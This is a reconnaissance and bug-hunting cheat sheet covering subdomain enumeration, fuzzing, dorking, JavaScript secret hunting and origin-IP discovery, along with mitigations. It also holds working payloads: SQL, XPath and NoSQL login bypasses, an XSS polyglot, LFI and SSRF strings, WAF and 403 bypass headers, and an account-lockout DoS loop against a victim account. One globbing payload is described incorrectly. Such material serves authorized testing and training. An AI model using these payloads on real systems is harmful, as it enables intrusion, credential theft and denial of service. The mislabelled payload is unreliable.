## Overview (Theory)

Reconnaissance is the initial and most critical phase of any penetration test or bug bounty hunt. The objective is to gather as much information as possible about a target system, its infrastructure, and its personnel to identify potential vulnerabilities and expand the attack surface. This phase can be divided into two main categories: **passive reconnaissance**, which involves gathering information without directly engaging with the target's systems, and **active reconnaissance**, which involves direct interaction that could be detected.

Effective reconnaissance involves identifying technologies, enumerating subdomains, discovering hidden directories and files, finding exposed source code or credentials, and fingerprinting services and firewalls. A thorough recon phase maps out the entire attack surface, revealing forgotten subdomains, debug endpoints, sensitive information in comments or error messages, and outdated software with known vulnerabilities. The more comprehensive the information gathered, the higher the likelihood of discovering exploitable weaknesses.

**Phase 2 Deep Discovery Focus:**
Reconnaissance Phase 2 focuses on deep discovery of hidden assets, parameters, and vulnerabilities through systematic fuzzing and analysis. This phase targets:

- **Hidden Parameters** - Undocumented API/application parameters
- **Hidden Endpoints** - Obscured routes and API paths
- **Hidden Files/Directories** - Backup files, config files, sensitive documents
- **Origin IP Discovery** - Finding real servers behind CDNs/WAFs
- **JavaScript Analysis** - Extracting endpoints, secrets, and vulnerabilities
- **Application-Level DoS** - Resource exhaustion vulnerabilities
- **EXIF Data Leakage** - Geolocation and metadata exposure

**Core Principle:** Context-aware fuzzing based on technology stack and application behavior.

---

## Recon Steps Checklist

### Phase 1: Asset Discovery

```bash
# Subdomain enumeration
subfinder -d target.com -silent | tee subdomains.txt
assetfinder --subs-only target.com | tee -a subdomains.txt
amass enum -d target.com

# Alive hosts
cat subdomains.txt | httpx -silent | tee alive-hosts.txt

# Crawling
gospider -s https://target.com -o crawl/
katana -u target.com -jc -d 5 -o katana-crawl.txt
echo "http://target.com" | hakrawler -d 3
```

### Phase 2: Technology Detection

```bash
# Identify tech stack
whatweb https://target.com
wappalyzer https://target.com

# HTTP headers analysis
curl --head http://target.com

# WAF detection
wafw00f https://target.com
nmap -p 80,443 --script=http-waf-fingerprint,http-waf-detect target.com

# This informs fuzzing strategy:
# - Express.js → Skip file extension fuzzing
# - REST API → Focus on endpoint segments
# - PHP → Fuzz for .php~ .bak files
```

### Phase 3: Passive Reconnaissance

#### Search Engine & Public Data Dorking

**Google & Bing Dorking:**
- `site:target.com intitle:"index of"` - Find directory listings
- `site:target.com ext:log | sql | xls | xml | json | csv` - Find sensitive file types
- `site:target.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git` - Find environment files
- `site:target.com allintext:username,password filetype:log` - Find logs with credentials
- `site:target.com "-----BEGIN RSA PRIVATE KEY-----"` - Find exposed private keys
- `site:trello.com | pastebin.com | github.com "target.com"` - Find mentions on third-party sites
- `site:*.thehacker.recipes -www` - Exclude known subdomains

**GitHub Dorking:**
- `"target.com" password`
- `"target.com" api_key`
- `"target.com" secret_key`
- `"target.com" filename:.env`
- `"target.com" "xoxp-" OR "xoxb-"` - Slack tokens
- `"target.com" AKIA[0-9A-Z]{16}` - AWS Access Keys
- `"target.com" "BEGIN RSA PRIVATE KEY"`
- `org:TargetCorp password` - Search within organization

**Automated GitHub Recon Tools:**
- [GitGot](https://github.com/BishopFox/GitGot)
- [gitGraber](https://github.com/hisxo/gitGraber)
- [git-hound](https://github.com/tillson/git-hound)

**Shodan Dorking:**
- `hostname:target.com` - Find devices matching hostname
- `org:"Target Inc."` - Find devices belonging to organization
- `ssl:"target.com"` - Find devices with SSL certificates
- `http.title:"Index of /" http.html:".pem"` - Find directory listings with PEM files
- `product:"MongoDB" org:"Target Inc."` - Find specific technologies
- `"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"` - Find Jenkins instances
- `"authentication disabled" port:5900` - Find unprotected VNC instances

#### Public Records & Datasets

**Certificate Transparency:**
- [crt.sh](https://crt.sh/)
- [censys.io](https://censys.io/)
- [Google's CT monitor](https://transparencyreport.google.com/https/certificates)

**ASN Discovery:**
```bash
whois -h whois.cymru.com $(dig +short target.com)
amass intel -org "Target Inc."
```
- [bgp.he.net](https://bgp.he.net)

**DNS Aggregators:**
- VirusTotal
- DNSdumpster

#### Source Code & Metadata Analysis

**HTML/JS/CSS Comments:**
- Manually inspect source code or use Burp Suite's "Engagement tools > Find comments"
- Look for endpoint information, credentials, or logic explanations

**JavaScript Files Analysis:**
```bash
# Create file with JS URLs
cat all-js-urls.txt | while read url; do 
  python3 SecretFinder.py -i $url -o cli >> secrets.txt
done
```

**Tools for JS analysis:**
- [LinkFinder](https://github.com/GerbenJavado/LinkFinder)
- [JSFScan.sh](https://github.com/KathanP19/JSFScan.sh)

**Exposed Source Code Repositories:**
- `https://target.com/.git/`
- `https://target.com/.svn/`
- `https://target.com/.hg/`
- `https://target.com/.bzr/`

**Tools to dump repositories:**
- [git-dumper](https://github.com/arthaud/git-dumper)
- [svn-extractor](https://github.com/anantshri/svn-extractor)

### Phase 4: Active Reconnaissance

#### Subdomain & VHost Enumeration

**DNS Bruteforcing:**
```bash
# Gobuster
gobuster dns --domain "target.com" --wordlist "/path/to/wordlist.txt" -t 50

# dnsrecon
dnsrecon -t brt -d "target.com" -D "/path/to/wordlist.txt"
```

**Virtual Host (VHost) Fuzzing:**
```bash
# ffuf
ffuf -w /path/to/wordlist.txt -u http://TARGET_IP -H "Host: FUZZ.target.com" -fs <size_of_default_page>

# gobuster
gobuster vhost --useragent "PENTEST" --wordlist "/path/to/wordlist.txt" --url http://TARGET_IP -t 50
```

**Comprehensive Enumeration Tools:**
```bash
# amass
amass enum -d target.com

# subfinder + httpx
subfinder -d target.com -silent | httpx -silent
```

#### Crawling & Content Discovery (Fuzzing)

**Pre-Fuzzing Checks:**
```bash
# Verify method - confirm you can find existing files first
GET /known-file.ext → 200 OK

# Then proceed with fuzzing
ffuf -w wordlist.txt -u "https://target.com/FUZZ" -ac
```

**Critical Considerations:**
- ✅ Generate custom wordlists from target context
- ✅ Adjust threads to avoid rate limiting/bans
- ✅ Modify User-Agent headers
- ✅ Check for CDN presence before aggressive fuzzing
- ❌ Skip file fuzzing on Express.js apps (no file extensions)
- ❌ Skip full endpoint fuzzing on REST APIs (focus on last segments)

**Directory/File Fuzzing:**
```bash
# ffuf (recursive)
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -recursion -recursion-depth 2 -e .php,.html,.txt

# Basic with status codes
ffuf -w wordlist.txt -u "https://target.com/FUZZ" -ac -mc 200,301,302,403

# gobuster
gobuster dir -u http://target.com -w /path/to/wordlist.txt -s '200,204,301,302,307,403' -e

# dirsearch
dirsearch -u https://target.com -w /path/to/wordlist.txt --extensions=php,html,js,bak -t 40
```

**Context-Aware File Extensions:**
```bash
# Old/backup file extensions
.7z, .back, .bak, .bck, .bz2, .copy, .gz, .old, .orig, .rar, .sav, .save, 
.tar, .tar.bz2, .gzip, .tar.gzip, .tgz, .tmp, .zip, .1, .2, .3, ~

# Domain-based backup fuzzing
target.com/target.com.zip
target.com/www.target.com.tar.gz
target.com/target.zip
target.com/target.log
```

**Best Wordlists for Fuzzing:**
- [SecLists/Discovery/Web-Content](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)
- [assetnote/commonspeak2-wordlists](https://github.com/assetnote/commonspeak2-wordlists)
- [six2dez/OneListForAll](https://github.com/six2dez/OneListForAll)

#### Endpoint Fuzzing

**REST API Example:**
```
Original: /api/user/699201852

Fuzz Patterns:
/api/user/699201852/FUZZ          # Additional actions
/api/user/FUZZ/699201852          # Middleware routes
/api/FUZZ/699201852/FUZZ          # Multi-level discovery
/api/user/699201852?FUZZ=value    # Parameter discovery
```

**KiteRunner for Full Endpoints:**
```bash
# Discovers entire API routes from wordlists
kiterunner scan target.com -w routes-large.kite
```

**FFUF for Endpoint Segments:**
```bash
# Last segment fuzzing
ffuf -w endpoints.txt -u "https://target.com/api/user/FUZZ"
```

#### PHP-Specific Fuzzing

**Single PHP Page Example:**
```
Original: /change_password.php

Fuzz Patterns:
/FUZZ.php                        # Other PHP files
/change_password.php~            # Backup files
/change_password.php.bak
/change_password.php.1
/change_password.phps            # PHP source
/change_password.php?FUZZ=value  # Parameters
```

#### Parameter Discovery

**Batch Parameter Testing:**
```
# Add multiple params to speed up discovery
GET /endpoint?param1=val&param2=val&param3=val&FUZZ=test
```

**Recommended Tools:**
- **x8** (Recommended) - Rust-based, fast parameter discovery
- **Arjun** - Python-based parameter fuzzer
- **parameth** - Alternative option
- **ParamSpider**

**x8 Usage:**
```bash
x8 -u "https://target.com/endpoint" -w params.txt --output found-params.txt
```

**Arjun Usage:**
```bash
arjun -u https://target.com/endpoint
python3 arjun.py -u https://target.com/endpoint
```

**ParamSpider Usage:**
```bash
python3 paramspider.py --domain target.com
```

#### Strategic Fuzzing Targets

**Priority Targets:**
1. Endpoints returning sensitive information
2. Files without parameters (likely to have hidden params)
3. Root and subdirectories for file/directory discovery
4. Admin panels and authentication endpoints

### Phase 5: Wordlist Generation

```bash
# Extract words/params from crawled data
gau target.com | unfurl -u keys | sort -u > params.txt
gau target.com | unfurl -u paths | cut -d'/' -f2- | sort -u > paths.txt

# Custom wordlist from JS files
cat js-files.txt | while read url; do
  curl -s $url | grep -oP '["'\''][a-zA-Z0-9_/-]+["'\'']'
done | sort -u > custom-words.txt
```

### Phase 6: JavaScript Analysis

#### What to Extract

**Target Intelligence:**
- Hidden endpoints and API routes
- Sensitive data (API keys, passwords, emails, tokens)
- Dangerous code patterns (DOM XSS, eval(), innerHTML)
- Internal infrastructure details

#### Manual Analysis (Chrome DevTools Method)

**Steps:**
1. Spider entire application
2. Export sitemap from Burp Suite
3. Open Chrome DevTools → Sources tab
4. Search across all JS files for:
   - `/api/` - Hidden endpoints
   - `apiKey`, `secret`, `password` - Credentials
   - `eval(`, `innerHTML`, `document.write` - DOM vulnerabilities

#### Automated Analysis

**Collection Phase:**
```bash
# Gather all JS files from multiple sources
waybackurls target.com | grep -E "\.js$" > js-files.txt
katana -u target.com -jc >> js-files.txt
gospider -s https://target.com --js >> js-files.txt

# Filter for live files
cat js-files.txt | httpx -mc 200 > live-js.txt
```

**Secret Extraction:**
```bash
# SecretFinder - Discovers API keys, tokens, credentials
cat live-js.txt | while read url; do 
  python3 SecretFinder.py -i $url -o cli >> secrets.txt
done
```

**Link Extraction:**
```bash
# LinkFinder - Extracts endpoints and paths
cat live-js.txt | while read url; do
  python3 linkfinder.py -i $url -o cli >> endpoints.txt
done
```

### Phase 7: Finding Origin IPs Behind WAFs/CDNs

#### Identifying WAF Presence

```bash
# Get current IP
dig +short target.com

# Check organization
curl -s https://ipinfo.io/IP_ADDRESS | jq -r '.org'

# Common WAF indicators:
# - Cloudflare, Inc.
# - AWS WAF (AWSLB/AWSLBCORS cookies)
# - Akamai Technologies
```

#### Discovery Techniques

**Historical DNS Records:**
```bash
# SecurityTrails DNS History
# Visit: https://securitytrails.com/domain/target.com/dns
# Extract historical A records

grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" dns_history.txt | sort -u > potential_ips.txt
```

**Also use:**
- [viewdns.info/iphistory](https://viewdns.info/iphistory/)

**Subdomain IP Enumeration:**
```bash
# Find subdomains and resolve IPs
subfinder -silent -d target.com | dnsprobe -silent | awk '{print $2}' | sort -u > subdomain_ips.txt

# Focus on: dev.*, staging.*, test.*, beta.*
```

**SSL Certificate Analysis:**

*Censys Method:*
1. Search certificates for your domain
2. Explore → IPv4 Hosts
3. Collect all associated IPs

*Shodan Queries:*
```
ssl.cert.subject.CN:"target.com"
ssl:"target.com"
```

**Email Header Analysis:**
1. Trigger emails (registration, password reset)
2. Check headers for:
   - `X-Originating-IP`
   - `Received` fields
   - `Return-Path`

**FavIcon Hash Search:**
```bash
# Generate favicon hash
python3 murmurhash.py -f https://target.com/favicon.ico

# Search on Shodan
http.favicon.hash:HASH_VALUE
```

#### IP Verification

**Test Each Potential IP:**
```bash
# Single IP test
curl -s -k -H "Host: target.com" https://POTENTIAL_IP/

# Batch testing
for ip in $(cat potential_ips.txt); do
  org=$(curl -s https://ipinfo.io/$ip | jq -r '.org')
  title=$(timeout 2 curl -s -k -H "Host: target.com" https://$ip/ | pup 'title text{}')
  echo "IP: $ip | Org: $org | Title: $title"
done
```

**Verification Checklist:**
- [ ] Response content matches main site
- [ ] Server headers match expected stack
- [ ] Administrative interfaces accessible
- [ ] Different error pages/messages

#### Automated Tools

**CloudFail:**
```bash
git clone https://github.com/m0rtem/CloudFail.git
cd CloudFail
pip install -r requirements.txt
python3 cloudfail.py -t target.com
```

**CloudFlair:**
```bash
git clone https://github.com/christophetd/CloudFlair
cd CloudFlair
pip install -r requirements.txt
python3 cloudflair.py target.com
```

#### DNS Rebinding Services

**Testing Services:**
- https://sslip.io/
- https://lock.cmpxchg8b.com/rebinder.html

---

## Bypasses

### WAF Bypasses

- **Identify the Real IP:** Use DNS history services to find the origin IP behind a WAF like Cloudflare
- **Header Spoofing:** Add headers like `X-Forwarded-For: 127.0.0.1` or `Client-Ip: 127.0.0.1` to trick the WAF/application
- **Encoding & Obfuscation:**
  - Use URL encoding (e.g., `%00` null bytes) or HTML encoding
  - Use character variations or different cases (`<scrIpt>`, `uni%0Bon`)
  - Use comments to break up payloads: `SELECT/*comment*/column/*comment*/FROM...`
- **HTTP Parameter Pollution (HPP):** Provide multiple parameters with the same name
  ```
  page.php?id=1&id=2
  ```
- **Verb Tampering:** Change the HTTP method from `GET` to `POST`, `PUT`, etc. or use `X-HTTP-Method-Override: PUT`

### Rate Limit Bypasses

- Append null bytes (`%00`, `%0d%0a`) or spaces (`%20`) to parameters
- Use different headers (`X-Forwarded-For`, `X-Real-IP`) to spoof your source IP
- Change the case of parameters (`user_id` -> `USER_ID`)
- Switch between `http://` and `https://`

### Handling 401/403 Forbidden

- **Recursive Fuzzing:** Sometimes a subdirectory is accessible even if the parent is not (e.g., `/admin/` is 403, but `/admin/assets/` is 200)
- **Header Bypasses:**
  - `X-Custom-IP-Authorization: 127.0.0.1`
  - `X-Original-URL: /admin`
  - `X-Rewrite-URL: /admin`
- **Path Traversal:** Try accessing the path with `..;` (e.g., `/forbidden/..;/allowed`)

### Admin Panel Authentication Bypass

**Default Credentials:**
```
admin:admin
admin:password
administrator:password
admin:admin123
root:root
admin:changeme
```

**SQL Injection:**
```sql
' OR '1'='1' --
admin' --
' OR 1=1 --
admin' OR '1'='1
```

**XPath Injection:**
```xpath
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
admin' or '
```

**Response Manipulation:**
```bash
# Intercept with Burp Suite and modify:
HTTP/1.1 200 OK           → HTTP/1.1 302 Found
{"status":"failed"}       → {"status":"success"}
{"authenticated":false}   → {"authenticated":true}
403 Forbidden            → 200 OK
```

**NoSQL Injection:**
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
```

---

## Payloads

1. **SQLi + XSS + SSTI Polyglot:** Test three vulnerability classes at once
   ```
   '"><svg/onload=prompt(1);>{{7*7}}
   ```

2. **LFI Path Traversal Pattern:** Classic directory traversal with null byte termination
   ```
   ..%2f..%2f..%2f..%2fetc/passwd%00
   ```

3. **LFI PHP Wrapper (Base64):** Use PHP filters to read source code
   ```
   php://filter/convert.base64-encode/resource=config.php
   ```

4. **Command Injection with Shell Logic:** Use shell logic operators or time delays
   ```
   ; sleep 10 #
   ```

5. **WAF Bypass (JS Context - Character Encoding):** Obfuscate JavaScript code using newlines
   ```
   %0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)
   ```

6. **WAF Bypass (SQLi - Obfuscation):** Use comments and non-standard keywords
   ```
   1/**/AND/**/MID(CURRENT_USER,1,1)/**/LIKE/**/'r'
   ```

7. **WAF Bypass (HTML Context - Alternative Tags):** Use less common HTML tags
   ```
   <details open ontoggle=alert(1)>
   ```

8. **SSRF to Internal Metadata Service:** Test for SSRF on cloud-hosted targets
   ```
   http://169.254.169.254/latest/meta-data/
   ```

9. **Exposed .git Repository Check:** Probe for the git config file
   ```
   /.git/config
   ```

10. **RCE via Globbing Bypass (Linux):** Use wildcards when specific characters are blocked
    ```
    /???/???/n?${IFS}/???/p?s?w?
    ```
    (Equivalent to `/usr/bin/nc /etc/passwd`)

---

## Advanced Recon

### Application-Level DoS Vulnerabilities

#### Email Bounce DoS

**Concept:** Exceed email provider's hard bounce limits to block all outgoing emails.

**Exploitation Steps:**
1. Identify invite/email functionality
2. Send invites to invalid addresses:
   ```
   nonexistent@invalid-domain-xyz123.com
   bounce-test-12345@example.com
   ```
3. Monitor bounce rates

**Hard Bounce Limits:**
- **HubSpot:** 5% limit
- **AWS SES:** 2-5% initial, 5-10% sustained

**Impact:** Email service provider blocks organization → No emails sent to legitimate users

#### Long Password DoS

**Concept:** No password length limit → CPU exhaustion during hashing.

**Testing Procedure:**
```bash
# Test 150-200 character password first
password="A"*200

# Observe response time increase
# Check for 500 errors or application crashes
```

**Prime Targets:**
- Forgot Password endpoints
- Change Password (authenticated)
- Password reset flows

⚠️ **Limit:** Use max 5000 characters to avoid infrastructure damage

#### Long String DoS

**Concept:** Extremely long input strings cause processing delays or crashes.

**Attack Vectors:**
- Username fields (1000+ characters)
- Address fields
- Profile picture filename parameters
- Search queries

**Testing:**
```bash
# Generate long string
python -c "print('A'*5000)" > long_string.txt

# Test in various fields
username=AAAAAAA...(5000 chars)
```

**Indicators:**
- Extended search/processing times
- 500 Internal Server Error
- Application timeout

#### Account Lockout DoS

**Concept:** Abuse account lockout mechanisms to permanently block victim access.

**Requirements:**
- No CAPTCHA on login
- Account lockout after X failed attempts
- Lockout period >30 minutes

**Exploitation:**
```bash
# Automated failed login attempts
for i in {1..50}; do
  curl -X POST https://target.com/login \
    -d "email=victim@target.com&password=wrong"
  sleep 1
done
```

**Severity:**
- **P2:** Permanent account lockout
- **P3/P4:** Temporary lockout >30 minutes

### Admin Panel Discovery

**Directory Fuzzing:**
```bash
ffuf -w admin-panels.txt -u "https://target.com/FUZZ"

# Common paths:
/admin, /administrator, /wp-admin, /cpanel, /panel, /dashboard, 
/manage, /controlpanel, /admin-console, /backend
```

**JavaScript Analysis:**
```bash
# Search JS files for admin routes
grep -r "admin\|panel\|dashboard" *.js
```

**Source Code Comments:**
```
View-Source (Ctrl+U) and search for:
<!-- admin, TODO, FIXME, DEBUG, password
```

**Testing Checklist:**
- [ ] Default credentials
- [ ] SQL injection in login
- [ ] XPath injection
- [ ] Response manipulation
- [ ] Parameter discovery (hidden auth params)
- [ ] JavaScript credential leakage
- [ ] Source code comments
- [ ] NoSQL injection

### EXIF Geolocation Data Leakage

**Concept:** Images retain metadata (EXIF data) including GPS coordinates, device info, and timestamps if not stripped server-side.

**Exposed Information:**
- GPS coordinates (latitude/longitude)
- Device make/model
- Software version
- Timestamp of capture
- Camera settings

**Testing Procedure:**
1. Download test images with EXIF data:
   ```
   https://github.com/ianare/exif-samples/tree/master/jpg
   ```
2. Upload image to target application
3. Retrieve uploaded image URL:
   - Right-click → Copy Image Address
   - Inspect Element → Find `<img src="">` URL
4. Analyze EXIF data:
   ```
   http://exif.regex.info/exif.cgi
   # Paste image URL
   ```
5. Check if geolocation and device data still present

**Impact Scenarios:**
- User location tracking
- Device fingerprinting
- Timestamp correlation for activity mapping
- Privacy violation (personal photos revealing home address)

### Known Vulnerabilities Research

**Once a technology and version are fingerprinted:**
```bash
searchsploit Apache 2.4.29
searchsploit -m <exploit_path>
```

**Online Databases:**
- Exploit-DB
- CVE Details
- NVD (National Vulnerability Database)

### Subdomain Takeover

**Process:**
1. Enumerate subdomains and check their CNAME records
2. If a CNAME points to a third-party service (e.g., Heroku, S3, GitHub Pages) but the corresponding service account has been deprovisioned, register that account to take control

**Fingerprints to look for:**
- "There isn't a Github Pages site here."
- "The specified bucket does not exist"
- "No such app" (Heroku)

### Exposed API Keys / Tokens

**Sources:**
- JS files
- GitHub repositories
- Mobile app code

**Potential Impact:**
- Unauthorized access to third-party services (AWS, Google Maps, Stripe)
- Data theft
- Financial loss

**Validation Tool:**
- [Key-Checker](https://github.com/daffainfo/Key-Checker)

### Default Credentials

**When you identify a technology or CMS:**
- Always check for default administrative credentials
- Jenkins, Grafana, Tomcat, etc.

**Resources:**
- [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

---

## Pro Tips & Best Practices

**Efficiency Boosters:**
- 🎯 Always use the **Verify Method** before fuzzing
- 🎯 Generate context-specific wordlists from target's sitemap
- 🎯 Combine multiple fuzzing techniques for comprehensive coverage
- 🎯 Rate limit your requests (use `-rate` flag in tools)

**Stealth & Evasion:**
- 🔒 Rotate User-Agent headers
- 🔒 Use residential proxies for sensitive targets
- 🔒 Implement delays between requests
- 🔒 Respect rate limits to avoid bans

**Documentation:**
- 📝 Log all discovered endpoints, parameters, and IPs
- 📝 Note which techniques worked for each finding
- 📝 Track false positives to refine wordlists
- 📝 Create reproducible PoCs for each vulnerability

**Continuous Learning:**
- 📚 Study target's tech stack documentation
- 📚 Research common misconfigurations for detected technologies
- 📚 Review disclosed reports for similar applications
- 📚 Iterate on wordlists based on findings

---

## Mitigations

**Code & Content Management:**
- Remove all developer comments, debugging information, and metadata from production code
- Ensure version control directories (`.git`, `.svn`) are never accessible from the web root
- Use a `.gitignore` file to exclude sensitive files like `.env` and configuration files from being committed

**Server Configuration:**
- Configure web servers to return generic, non-descriptive error messages
- Disable stack traces and version information in production
- Disable directory listing on the web server
- Implement strong access controls on all paths, especially administrative interfaces and sensitive directories

**Security Headers:**
- Use HTTP security headers: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`

**Dependency Management:**
- Regularly scan and update all third-party libraries, frameworks, and CMS components to patch known vulnerabilities

**Network Security:**
- Use a properly configured Web Application Firewall (WAF) to filter malicious requests
- Regularly audit DNS records and remove CNAMEs pointing to deprovisioned services to prevent subdomain takeovers

**Secret Management:**
- Never hardcode API keys, tokens, or credentials in client-side code or public repositories
- Use secure secret management solutions like Vault or cloud provider services (e.g., AWS Secrets Manager)

---

## Reference Links

**Fuzzing Tools:**
- FFUF: https://github.com/ffuf/ffuf
- KiteRunner: https://github.com/assetnote/kiterunner
- x8: https://github.com/Sh1Yo/x8
- Arjun: https://github.com/s0md3v/Arjun
- ParamSpider: https://github.com/devanshbatham/ParamSpider
- IIS-Shortname-Scanner: Various implementations available

**JS Analysis:**
- SecretFinder: https://github.com/m4ll0k/SecretFinder
- LinkFinder: https://github.com/GerbenJavado/LinkFinder
- JSFScan.sh: https://github.com/KathanP19/JSFScan.sh

**Origin IP Discovery:**
- CloudFail: https://github.com/m0rtem/CloudFail
- CloudFlair: https://github.com/christophetd/CloudFlair

**GitHub Recon:**
- GitGot: https://github.com/BishopFox/GitGot
- gitGraber: https://github.com/hisxo/gitGraber
- git-hound: https://github.com/tillson/git-hound

**Repository Dumping:**
- git-dumper: https://github.com/arthaud/git-dumper
- svn-extractor: https://github.com/anantshri/svn-extractor

**Subdomain Enumeration:**
- Amass: https://github.com/OWASP/Amass
- Subfinder: https://github.com/projectdiscovery/subfinder
- Assetfinder: https://github.com/tomnomnom/assetfinder

**Crawling & Spidering:**
- Hakrawler: https://github.com/hakluke/hakrawler
- GoSpider: https://github.com/jaeles-project/gospider
- Katana: https://github.com/projectdiscovery/katana
- GAU (Get All URLs): https://github.com/lc/gau

**Probing & Validation:**
- httpx: https://github.com/projectdiscovery/httpx
- dnsprobe: https://github.com/projectdiscovery/dnsprobe

**Technology Fingerprinting:**
- WhatWeb: https://github.com/urbanadventurer/WhatWeb
- Wappalyzer: https://www.wappalyzer.com/
- wafw00f: https://github.com/EnableSecurity/wafw00f

**Wordlists:**
- SecLists: https://github.com/danielmiessler/SecLists
- Commonspeak2: https://github.com/assetnote/commonspeak2-wordlists
- OneListForAll: https://github.com/six2dez/OneListForAll

**Credential Resources:**
- DefaultCreds-cheat-sheet: https://github.com/ihebski/DefaultCreds-cheat-sheet
- Key-Checker: https://github.com/daffainfo/Key-Checker

**Public Data Sources:**
- crt.sh: https://crt.sh/
- Censys: https://censys.io/
- Shodan: https://www.shodan.io/
- VirusTotal: https://www.virustotal.com/
- DNSdumpster: https://dnsdumpster.com/
- SecurityTrails: https://securitytrails.com/
- ViewDNS: https://viewdns.info/
- BGP.he.net: https://bgp.he.net

**EXIF Analysis:**
- EXIF Data Viewer: http://exif.regex.info/exif.cgi
- EXIF Sample Images: https://github.com/ianare/exif-samples

**HackerOne Reports (Learning Resources):**
- EXIF Geolocation IDOR: https://hackerone.com/reports/906907
- Long Password DoS: https://hackerone.com/reports/738569
- Long String DoS: https://hackerone.com/reports/764434

**Additional Resources:**
- Google CT Monitor: https://transparencyreport.google.com/https/certificates
- DNS Rebinding Tools:
  - https://sslip.io/
  - https://lock.cmpxchg8b.com/rebinder.html

---

## Quick Reference Commands

### One-Liner Collection

```bash
# Full subdomain enumeration pipeline
subfinder -d target.com -silent | dnsprobe -silent | httpx -silent -title -status-code

# Extract all URLs from Wayback Machine
waybackurls target.com | tee wayback-urls.txt

# Find all JS files and check for secrets
waybackurls target.com | grep "\.js" | httpx -mc 200 | tee js-files.txt | while read url; do python3 SecretFinder.py -i $url -o cli; done

# Quick parameter discovery
echo "https://target.com/endpoint" | x8 -w /path/to/params.txt

# Find subdomains from certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# Check for exposed git repositories
echo "target.com" | waybackurls | grep -E "\.git" | sort -u

# Extract endpoints from JavaScript files
cat js-files.txt | while read url; do python3 linkfinder.py -i $url -o cli; done | grep -oP 'https?://[^"]+' | sort -u

# Scan for common backup files
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -e .bak,.old,.backup,.zip,.tar.gz

# Find admin panels
ffuf -w /path/to/admin-panels.txt -u https://target.com/FUZZ -mc 200,301,302,403

# Comprehensive tech stack fingerprinting
whatweb -a 3 https://target.com

# Quick WHOIS and ASN lookup
whois target.com | grep -E "NetRange|CIDR|Organization"

# Extract all parameters from URLs
gau target.com | unfurl -u keys | sort -u

# Check for IIS shortname vulnerability
java -jar iis_shortname_scanner.jar https://target.com/

# Batch test potential origin IPs
for ip in $(cat potential-ips.txt); do curl -s -k -H "Host: target.com" https://$ip/ --connect-timeout 3 | grep -o "<title>.*</title>"; done

# Recursive directory fuzzing with extensions
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -recursion -recursion-depth 2 -e .php,.html,.js,.txt,.bak -mc 200,301,302,403

# Find hidden vhosts
ffuf -w /path/to/subdomains.txt -u https://TARGET_IP -H "Host: FUZZ.target.com" -fs 0

# Extract emails from HTML/JS
curl -s https://target.com | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

# Check for WAF using multiple methods
wafw00f https://target.com && nmap -p 443 --script http-waf-detect target.com

# Find API endpoints in mobile apps (APK decompiled)
grep -r "https://.*api" /path/to/decompiled/ | grep -oP 'https://[^"]+' | sort -u

# Search Shodan for organization assets
shodan search "org:'Target Inc.'" --fields ip_str,port,product

# Hunt for AWS S3 buckets
curl -s https://target.com | grep -oP 's3\.amazonaws\.com/[^"]+' | sort -u

# Extract hardcoded credentials from JS
grep -rE "(api_key|apikey|api-key|password|passwd|pwd|secret|token)" *.js

# Check for open redirects in parameters
gau target.com | gf redirect | httpx -silent -status-code -title

# Find potential SSRF parameters
gau target.com | gf ssrf | tee ssrf-params.txt

# Enumerate subdomains using multiple sources
amass enum -passive -d target.com -o amass-subs.txt && subfinder -d target.com -o subfinder-subs.txt && cat amass-subs.txt subfinder-subs.txt | sort -u

# Quick LFI test on discovered parameters
ffuf -w /path/to/lfi-payloads.txt -u "https://target.com/page?file=FUZZ" -mr "root:"

# Extract all forms and their actions
curl -s https://target.com | grep -oP '<form.*?</form>' | grep -oP 'action="[^"]+"'

# Check for clickjacking vulnerability
curl -s -I https://target.com | grep -i "x-frame-options\|content-security-policy"

# Find interesting files in robots.txt
curl -s https://target.com/robots.txt | grep "Disallow" | awk '{print $2}'

# Mass check for exposed .git directories
cat subdomains.txt | httpx -silent -path "/.git/config" -mc 200

# Check for security headers
curl -s -I https://target.com | grep -iE "strict-transport|x-frame|x-content|x-xss|content-security"

# Extract all subdomains from SSL certificates via crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].common_name' | sort -u | grep target.com

# Find WordPress installations
ffuf -w subdomains.txt -u https://FUZZ.target.com/wp-login.php -mc 200

# Check for CORS misconfiguration
curl -H "Origin: https://evil.com" -I https://target.com/api/endpoint

# Extract internal IPs from HTML/JS
curl -s https://target.com | grep -oP '\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}\b'

# Find potential SQLi parameters
gau target.com | gf sqli | tee sqli-params.txt

# Check for XML External Entity (XXE) endpoints
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -X POST -H "Content-Type: application/xml" -mc 200,500

# Enumerate cloud storage buckets
echo "target" | sed 's/\.//g' | tee buckets.txt && cat buckets.txt | while read bucket; do curl -s "https://$bucket.s3.amazonaws.com" | grep -q "NoSuchBucket" || echo "[FOUND] $bucket"; done
```

---

## Recon Automation Script Template

```bash
#!/bin/bash

# Ultimate Recon Automation Script
# Usage: ./recon.sh target.com

TARGET=$1
OUTPUT_DIR="recon_${TARGET}_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 target.com"
    exit 1
fi

echo "[+] Creating output directory: $OUTPUT_DIR"
mkdir -p $OUTPUT_DIR/{subdomains,urls,js,endpoints,params,ips,screenshots}

echo "[+] Phase 1: Subdomain Enumeration"
